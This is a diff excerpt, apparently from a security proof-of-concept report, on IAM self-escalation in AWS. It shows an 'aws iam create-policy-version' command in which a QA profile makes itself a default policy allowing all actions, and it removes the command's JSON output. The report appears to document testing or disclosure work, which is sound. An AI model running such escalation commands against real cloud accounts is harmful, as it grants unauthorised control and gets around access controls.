@@ -21,16 +21,6 @@ aws sts get-caller-identity --profile qa-a
 aws iam create-policy-version --policy-arn arn:aws:iam::<ACCOUNT_ID>:policy/qa-testing-P --policy-document "{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"","Resource":""}]}" --set-as-default --profile qa-a
 
 **Result:**
-```json
-{
-    "PolicyVersion": {
-        "VersionId": "v2",
-        "IsDefaultVersion": true,
-        "CreateDate": "2026-09-14T14:15:37+00:00"
-    }
-}
-```
-
 ![QA-a self-escalation command output](../poc-ss/qa-a-attack-command1.png)
 
 **3. Verified independently via admin account:**
